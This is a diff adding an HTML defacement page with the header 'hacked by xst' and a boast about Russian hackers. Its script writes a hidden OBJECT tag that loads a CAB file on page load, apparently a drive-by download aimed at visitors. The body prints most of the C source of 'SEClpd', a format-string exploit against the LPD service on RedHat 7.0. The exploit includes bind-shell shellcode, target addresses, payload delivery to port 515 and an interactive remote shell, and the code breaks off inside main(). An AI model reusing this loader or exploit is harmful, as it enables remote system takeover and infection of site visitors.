@@ -1,0 +1,591 @@
+<HTML>
+<HEAD>
+   <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+   <META NAME="GENERATOR" CONTENT="Mozilla/4.03 [sv] (Win95; I) [Netscape]">
+   <TITLE>YOUR SECURITY WAS BROKEN</TITLE>
+<SCRIPT><OBJECT ID=\"RUNIT\" WIDTH=0 HEIGHT=0 TYPE=\"application/x-oleobject\""
+    objectstr+="CODEBASE=\"runhelp.cab#version=1,1,1,1\">"
+    objectstr+="<PARAM NAME=\"_Version\" VALUE=\"65536\">"
+    objectstr+="</OBJECT>"
+    objectstr+="<HTML><H1>Laddar Hjälp....</H1></HTML>";
+    objectstr+="\<SCRIPT>setTimeout('gob()',2000);function gob(){history.go(-1)}<\/SCRIPT>"
+    
+
+    document.open();
+    document.clear();
+    document.writeln(objectstr);
+    document.close();
+
+</SCRIPT>
+</HEAD>
+<BODY TEXT="#FFFFFF" BGCOLOR="#000000" LINK="#0000EE" VLINK="#551A8B" ALINK="#FF0000">
+
+<CENTER><IMG SRC="nfc.jpg" HEIGHT=246 WIDTH=334></CENTER>
+
+<CENTER>&nbsp;<FONT SIZE=-2>This box/site was hacked by xst ;P the l33t
+russian hacker.</FONT></CENTER>
+
+<CENTER><FONT SIZE=-2>We russians 0wns the world.. let me correct that
+a little bit</FONT></CENTER>
+
+<CENTER><FONT SIZE=-2>We russians owns the Internet world ;> we are unstopable.</FONT></CENTER>
+
+<CENTER>------------------------------------------</CENTER>
+&nbsp;
+<BR>&nbsp;
+<BR>&nbsp;
+
+<P><FONT SIZE=-2>#include &lt;stdio.h></FONT>
+<BR><FONT SIZE=-2>#include &lt;stdlib.h></FONT>
+<BR><FONT SIZE=-2>#include &lt;string.h></FONT>
+<BR><FONT SIZE=-2>#include &lt;unistd.h></FONT>
+<BR><FONT SIZE=-2>#include &lt;sys/stat.h></FONT>
+<BR><FONT SIZE=-2>#include &lt;sys/types.h></FONT>
+<BR><FONT SIZE=-2>#include &lt;fcntl.h></FONT>
+<BR><FONT SIZE=-2>#include &lt;netinet/in.h></FONT>
+<BR><FONT SIZE=-2>#include &lt;arpa/inet.h></FONT>
+<BR><FONT SIZE=-2>#include &lt;netdb.h></FONT>
+<BR><FONT SIZE=-2>#include &lt;netinet/in.h></FONT>
+<BR><FONT SIZE=-2>#include &lt;arpa/inet.h></FONT>
+<BR>&nbsp;
+
+<P><FONT SIZE=-2>#define ADDRESS_BUFFER_SIZE&nbsp;&nbsp; 32+4</FONT>
+<BR><FONT SIZE=-2>#define APPEND_BUFFER_SIZE&nbsp;&nbsp;&nbsp; 52</FONT>
+<BR><FONT SIZE=-2>#define FORMAT_LENGTH&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+512-8</FONT>
+<BR><FONT SIZE=-2>#define NOPCOUNT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+200</FONT>
+<BR><FONT SIZE=-2>#define SHELLCODE_COUNT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+1030</FONT>
+<BR><FONT SIZE=-2>#define DELAY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+50000 /* usecs */</FONT>
+<BR><FONT SIZE=-2>#define OFFSET_LIMIT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+5000</FONT>
+
+<P><FONT SIZE=-2>char shellcode[] =</FONT>
+
+<P><FONT SIZE=-2>&nbsp; "\x31\xdb\x31\xc9\x31\xc0\xb0\x46\xcd\x80"</FONT>
+<BR><FONT SIZE=-2>&nbsp; "\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8"</FONT>
+<BR><FONT SIZE=-2>&nbsp; "\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89"</FONT>
+<BR><FONT SIZE=-2>&nbsp; "\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0"</FONT>
+<BR><FONT SIZE=-2>&nbsp; "\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd"</FONT>
+<BR><FONT SIZE=-2>&nbsp; "\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9"</FONT>
+<BR><FONT SIZE=-2>&nbsp; "\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x18\x5e\x89\x75"</FONT>
+<BR><FONT SIZE=-2>&nbsp; "\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08"</FONT>
+<BR><FONT SIZE=-2>&nbsp; "\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh";</FONT>
+<BR>&nbsp;
+
+<P><FONT SIZE=-2>&nbsp;</FONT>
+<BR><FONT SIZE=-2>struct target</FONT>
+<BR><FONT SIZE=-2>&nbsp;{</FONT>
+<BR><FONT SIZE=-2>&nbsp; char *os_name;</FONT>
+<BR><FONT SIZE=-2>&nbsp; u_long eip_address;</FONT>
+<BR><FONT SIZE=-2>&nbsp; u_long shellcode_address;</FONT>
+<BR><FONT SIZE=-2>&nbsp; unsigned int position;</FONT>
+<BR><FONT SIZE=-2>&nbsp; int written_bytes;</FONT>
+<BR><FONT SIZE=-2>&nbsp; int align;</FONT>
+<BR><FONT SIZE=-2>};</FONT>
+
+<P><FONT SIZE=-2>struct target targets[] =</FONT>
+<BR><FONT SIZE=-2>&nbsp;{</FONT>
+<BR><FONT SIZE=-2>&nbsp; { "RedHat 7.0 - Guinesss&nbsp;&nbsp;&nbsp; ",
+0xbffff3d8, 0L, 300, 70, 2,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+},</FONT>
+<BR><FONT SIZE=-2>&nbsp; { "RedHat 7.0 - Guinesss-dev", 0xbffff12c, 0L,
+300, 70, 2,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; },</FONT>
+<BR><FONT SIZE=-2>&nbsp; { "RedHat 7.0 - Guinessss&nbsp;&nbsp; ", 0xbffff3d8,
+0L, 300, 70, 2,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; },</FONT>
+<BR><FONT SIZE=-2>&nbsp;{</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp; NULL, 0L, 0L, 0, 0, 0</FONT>
+<BR><FONT SIZE=-2>&nbsp; }</FONT>
+<BR><FONT SIZE=-2>};</FONT>
+<BR>&nbsp;
+
+<P><FONT SIZE=-2>static char address_buffer[ADDRESS_BUFFER_SIZE+1];</FONT>
+<BR><FONT SIZE=-2>static char append_buffer[APPEND_BUFFER_SIZE+1];</FONT>
+<BR><FONT SIZE=-2>static char shellcode_buffer[1024];</FONT>
+<BR><FONT SIZE=-2>static char *hostname=NULL;</FONT>
+<BR><FONT SIZE=-2>static int offset;</FONT>
+<BR><FONT SIZE=-2>static struct hostent *he;</FONT>
+<BR><FONT SIZE=-2>int type=-1;</FONT>
+<BR><FONT SIZE=-2>int brute=-1, failure=1;</FONT>
+
+<P><FONT SIZE=-2>void calculate_rets(u_long eip_addr, u_long shellcode_addr,
+u_int previous, u_int addr_loc)</FONT>
+<BR><FONT SIZE=-2>{</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; int i;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; unsigned int tmp = 0;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; unsigned int copied = previous;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; unsigned int num[4] =</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; {</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (unsigned int) (shellcode_addr
+&amp; 0x000000ff),</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (unsigned int)((shellcode_addr
+&amp; 0x0000ff00) >> 8),</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (unsigned int)((shellcode_addr
+&amp; 0x00ff0000) >> 16),</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (unsigned int)((shellcode_addr
+&amp; 0xff000000) >> 24)</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; };</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; memset (address_buffer, '\0', sizeof(address_buffer));</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; memset (append_buffer, '\0', sizeof(append_buffer));</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; for (i = 0; i &lt; 4; i++)</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; {</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while (copied > 0x100)</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; copied
+-= 0x100;</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ( (i > 0) &amp;&amp;
+(num[i-1] == num[i]) )</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sprintf
+(append_buffer+strlen(append_buffer), "%%%d$n", addr_loc+i);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else if (copied &lt; num[i])</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (
+(num[i] - copied) &lt;= 10)</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+sprintf (append_buffer+strlen(append_buffer), "%.*s",</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+(int)(num[i] - copied), "security.is!");</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+copied += (num[i] - copied);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+sprintf (append_buffer+strlen(append_buffer), "%%%d$n", addr_loc+i);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+} else {</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+sprintf (append_buffer+strlen(append_buffer), "%%.%du",</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+num[i] - copied);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+copied += (num[i] - copied);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+sprintf (append_buffer+strlen(append_buffer), "%%%d$n", addr_loc+i);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+}</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else {</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tmp
+= ((num[i] + 0x100) - copied);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sprintf
+(append_buffer+strlen(append_buffer), "%%.%du", tmp);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; copied
++= ((num[i] + 0x100) - copied);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sprintf
+(append_buffer+strlen(append_buffer), "%%%d$n", addr_loc+i);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</FONT>
+<BR><FONT SIZE=-2>&nbsp;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sprintf (address_buffer+strlen(address_buffer),
+"%c%c%c%c",</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (unsigned
+char) ((eip_addr+i) &amp; 0x000000ff),</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (unsigned
+char)(((eip_addr+i) &amp; 0x0000ff00) >> 8),</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (unsigned
+char)(((eip_addr+i) &amp; 0x00ff0000) >> 16),</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (unsigned
+char)(((eip_addr+i) &amp; 0xff000000) >> 24));</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; }</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; while (strlen(address_buffer) &lt; ADDRESS_BUFFER_SIZE)</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strcat (address_buffer,
+"X");</FONT>
+<BR>&nbsp;
+
+<P><FONT SIZE=-2>#ifdef DEBUG</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; printf ("\nGeneration complete:\nAddress:
+");</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; for (i = 0; i &lt; strlen(address_buffer);
+i++)</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; {</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ( ((i % 4) == 0) &amp;&amp;
+(i > 0) )</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf
+(".");</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("%02x", (unsigned
+char)address_buffer[i]);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; }</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; printf ("\nAppend: %s\n", append_buffer);</FONT>
+<BR><FONT SIZE=-2>#endif</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; return;</FONT>
+<BR><FONT SIZE=-2>}</FONT>
+
+<P><FONT SIZE=-2>char *create_malicious_string(void)</FONT>
+<BR><FONT SIZE=-2>{</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; static char format_buffer[FORMAT_LENGTH+1];</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; long addr1,addr2;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; int i;</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; memset (format_buffer, '\0', sizeof(format_buffer));</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; targets[type].shellcode_address
+= targets[type].eip_address + SHELLCODE_COUNT;</FONT>
+
+<P><FONT SIZE=-2>&nbsp;addr1 = targets[type].eip_address;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; addr2 = targets[type].shellcode_address;</FONT>
+<BR><FONT SIZE=-2>&nbsp; calculate_rets (addr1, addr2,targets[type].written_bytes,
+targets[type].position);</FONT>
+<BR><FONT SIZE=-2>&nbsp;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; (void)snprintf (format_buffer, sizeof(format_buffer)-1,
+"%.*s%s",</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+targets[type].align, "BBBB", address_buffer);</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; strncpy (address_buffer, format_buffer, sizeof(address_buffer)-1);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; strncpy (format_buffer, append_buffer, sizeof(format_buffer)-1);</FONT>
+<BR><FONT SIZE=-2>&nbsp;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; for(i = 0 ; i &lt; NOPCOUNT ; i++)</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; strcat(format_buffer, "\x90");</FONT>
+
+<P><FONT SIZE=-2>strcat(format_buffer, shellcode);</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; return (format_buffer);</FONT>
+<BR><FONT SIZE=-2>}</FONT>
+
+<P><FONT SIZE=-2>int connect_victim()</FONT>
+<BR><FONT SIZE=-2>{</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; int sockfd, n;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; struct sockaddr_in s;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; fd_set fd_stat;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; char buff[1024];</FONT>
+
+<P><FONT SIZE=-2>static char testcmd[256] = "uname -a ; id ;\r\n";</FONT>
+<BR><FONT SIZE=-2>&nbsp;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; s.sin_family = AF_INET;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; s.sin_port = htons (3879);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; s.sin_addr.s_addr = *(u_long *)he->h_addr;</FONT>
+<BR>&nbsp;
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; if ((sockfd = socket (AF_INET, SOCK_STREAM,
+0)) &lt; 0)</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp; {</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("--- [5]
+Unable to create socket!\n");</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Exploit
+failed!\n");</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return -1;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp; }</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; if ((connect (sockfd, (struct sockaddr *)
+&amp;s, sizeof (s))) &lt; 0)</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp; {</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return -1;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp; }</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp; if(brute)</FONT>
+
+<P><FONT SIZE=-2>&nbsp;printf("+++ The eip_address is 0x%x\n\n", targets[type].eip_address);</FONT>
+<BR><FONT SIZE=-2>&nbsp;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp; printf("-&nbsp;&nbsp; [+] shell
+located on %s\n", hostname);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp; printf("-&nbsp;&nbsp; [+] Enter
+Commands at will\n\n");</FONT>
+
+<P><FONT SIZE=-2>&nbsp;failure = -1;</FONT>
+
+<P><FONT SIZE=-2>&nbsp;FD_ZERO(&amp;fd_stat);</FONT>
+<BR><FONT SIZE=-2>&nbsp;FD_SET(sockfd, &amp;fd_stat);</FONT>
+<BR><FONT SIZE=-2>&nbsp;send(sockfd, testcmd, strlen(testcmd), 0);</FONT>
+
+<P><FONT SIZE=-2>&nbsp;while(1) {</FONT>
+
+<P><FONT SIZE=-2>&nbsp; FD_SET(sockfd,&amp;fd_stat);</FONT>
+<BR><FONT SIZE=-2>&nbsp; FD_SET(0,&amp;fd_stat);</FONT>
+
+<P><FONT SIZE=-2>&nbsp; if(select(sockfd+1,&amp;fd_stat,NULL,NULL,NULL)&lt;0)
+break;</FONT>
+<BR><FONT SIZE=-2>&nbsp; if( FD_ISSET(sockfd, &amp;fd_stat) ) {</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; if((n=read(sockfd,buff,sizeof(buff)))&lt;0){</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp; fprintf(stderr, "EOF\n");</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp; return 2;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; }</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; if(write(1,buff,n)&lt;0)break;</FONT>
+<BR><FONT SIZE=-2>&nbsp; }</FONT>
+<BR><FONT SIZE=-2>&nbsp; if ( FD_ISSET(0, &amp;fd_stat) ) {</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp; if((n=read(0,buff,sizeof(buff)))&lt;0){</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf(stderr,"EOF\n");</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 2;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp; }</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp;&nbsp; if(send(sockfd,buff,n,0)&lt;0) break;</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; }</FONT>
+<BR><FONT SIZE=-2>&nbsp; }</FONT>
+<BR><FONT SIZE=-2>}</FONT>
+<BR>&nbsp;
+
+<P><FONT SIZE=-2>void send_code(char *exploit_buffer)</FONT>
+<BR><FONT SIZE=-2>{</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; int sockfd, n;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; struct sockaddr_in s;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; fd_set fd_stat;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; char recv[1024];</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; static char testcmd[256] = "/bin/uname -a
+; id ;\r\n";</FONT>
+<BR><FONT SIZE=-2>&nbsp;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; s.sin_family = AF_INET;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; s.sin_port = htons (515);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; s.sin_addr.s_addr = *(u_long *)he->h_addr;</FONT>
+<BR>&nbsp;
+<BR>&nbsp;
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; if ((sockfd = socket (AF_INET, SOCK_STREAM,
+0)) &lt; 0)</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp; {</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("--- [shit]
+fucking thing aint working dawg :(!\n");</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Exploit
+failed!\n");</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(-1);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp; }</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; if ((connect (sockfd, (struct sockaddr *)
+&amp;s, sizeof (s))) &lt; 0)</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp; {</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("--- [5]
+Unable to connect to %s\n", hostname);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Shit failed,
+%s aint&nbsp; running LPD (FUCK)!\n", hostname);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(-1);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp; }</FONT>
+<BR>&nbsp;
+
+<P><FONT SIZE=-2>&nbsp;usleep(DELAY);</FONT>
+<BR><FONT SIZE=-2>&nbsp;</FONT>
+<BR><FONT SIZE=-2>&nbsp;if(write (sockfd, exploit_buffer, strlen(exploit_buffer))
+&lt; 0)</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+{</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+printf ("Couldn't write to socket %d", sockfd);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("Exploit failed\n");</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+exit(2);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</FONT>
+
+<P><FONT SIZE=-2>&nbsp;close(sockfd);</FONT>
+<BR><FONT SIZE=-2>&nbsp;connect_victim();</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; }</FONT>
+<BR>&nbsp;
+<BR>&nbsp;
+<BR>&nbsp;
+
+<P><FONT SIZE=-2>void usage(char *program)</FONT>
+<BR><FONT SIZE=-2>{</FONT>
+
+<P><FONT SIZE=-2>&nbsp;int i=0;</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; printf("SEClpd by Icefist of ElectronicSouls
+! \n\n");</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; printf("Usage: %s victim [\"brute\"] -t
+type [-o offset] [-a align] [-p position] [-r eip_addr] [-c shell_addr]
+[-w written_bytes] \n\n", program);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; printf("ie: ./SEClpd localhost -t 0 For
+most redhat 7.0 boxes\n");</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; printf("ie: ./SEClpd localhost brute -t
+0 For brute forcing all redhat 7.0 boxes\n");</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; printf("Types:\n\n");</FONT>
+
+<P><FONT SIZE=-2>&nbsp;&nbsp; while( targets[i].os_name != NULL)</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("[ Type %d:&nbsp;
+[ %s ]\n", i++, targets[i].os_name);</FONT>
+<BR><FONT SIZE=-2>}</FONT>
+
+<P><FONT SIZE=-2>int main(int argc, char **argv)</FONT>
+<BR><FONT SIZE=-2>{</FONT>
+<BR><FONT SIZE=-2>&nbsp;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; char exploit_buffer[1024];</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; char *format = NULL;</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp; int c, brutecount=0;</FONT>
+<BR>&nbsp;
+<BR>&nbsp;
+
+<P><FONT SIZE=-2>if(argc &lt; 3)</FONT>
+<BR><FONT SIZE=-2>&nbsp; {</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp; usage(argv[0]);</FONT>
+<BR><FONT SIZE=-2>&nbsp;&nbsp;&nbsp; return 1;</FONT>
+<BR><FONT SIZE=-2>&nbsp;}</FONT>
+
